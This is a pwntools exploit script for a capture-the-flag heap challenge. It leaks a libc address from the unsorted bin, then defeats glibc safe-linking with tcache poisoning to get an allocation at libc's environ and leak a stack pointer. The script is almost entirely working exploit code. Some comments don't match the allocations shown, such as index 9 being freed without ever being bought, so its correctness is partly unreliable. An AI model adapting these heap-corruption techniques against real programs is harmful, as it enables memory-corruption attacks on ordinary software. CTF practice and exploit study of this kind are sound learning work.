from pwn import *

context.binary = "./chal"
context.log_level = "info"

UNSORTED_OFFSET = 0x210b20  # (main_arena+0x60) - libc_base
ENVIRON_OFF     = 0x217e28  # environ symbol offset

io = process("./chal")

def menu(c): io.sendlineafter(b"> ", str(c).encode())
def buy(i):  menu(1); io.sendlineafter(b"> ", str(i).encode())
def sell(i): menu(4); io.sendlineafter(b"> ", str(i).encode())
def name(i, data):
    menu(2)
    io.sendlineafter(b"> ", str(i).encode())
    io.sendafter(b"Name your labubu\n", data)
def admire(i):
    menu(3)
    io.sendlineafter(b"> ", str(i).encode())
    return io.recvn(0x400)

# -------------------------
# Step 1: libc leak (unsorted)
# Allocate 0..8 (9 chunks). Free 0..6 to fill tcache (7).
# Free 7 -> unsorted (8 is fence).
# -------------------------
for i in range(9):
    buy(i)

for i in range(7):
    sell(i)
sell(7)

leak = admire(7)
fd = u64(leak[:8])
libc_base = fd - UNSORTED_OFFSET
environ_addr = libc_base + ENVIRON_OFF

log.success(f"fd leak      = {hex(fd)}")
log.success(f"libc_base     = {hex(libc_base)}")
log.success(f"environ@libc   = {hex(environ_addr)}")

# -------------------------
# Step 2: drain the 7 tcache entries for this size
# Those entries are the freed chunks from idx 0..6.
# Re-buy 0..6 to pop them out of tcache.
# -------------------------
for i in range(7):
    buy(i)

# -------------------------
# Step 3: create a clean single-entry tcache chunk at idx 9
# (idx 9 is allocated from earlier; we can free it and use it)
# -------------------------
sell(8)   # free fence first (optional)
sell(9)   # free idx9 into tcache (now bin has 1 entry)

leak9 = admire(9)
stored_fd = u64(leak9[:8])      # if real next is NULL => stored_fd == chunk>>12
tcache_key = u64(leak9[8:16])   # must preserve this!

chunk_shift = stored_fd         # because real_fd = 0
log.info(f"stored_fd (chunk>>12) = {hex(stored_fd)}")
log.info(f"tcache_key            = {hex(tcache_key)}")

# -------------------------
# Step 4: poison fd to point to environ (safe-linking)
# MUST keep the key unchanged, so write 16 bytes: fd + key
# stored_fd_new = environ ^ (chunk>>12)
# -------------------------
poison_fd = environ_addr ^ chunk_shift
payload = p64(poison_fd) + p64(tcache_key) + b"\n"
name(9, payload)

# -------------------------
# Step 5: malloc twice:
# - first malloc returns the real idx9 chunk
# - second malloc returns a "chunk" at environ
# -------------------------
buy(8)    # takes idx9 chunk back (any free index is fine)
buy(9)    # returns pointer == environ_addr

# Leak environ value (stack pointer) from the first 8 bytes
env_data = admire(9)
stack_ptr = u64(env_data[:8])
log.success(f"environ value (stack ptr) = {hex(stack_ptr)}")

io.interactive()
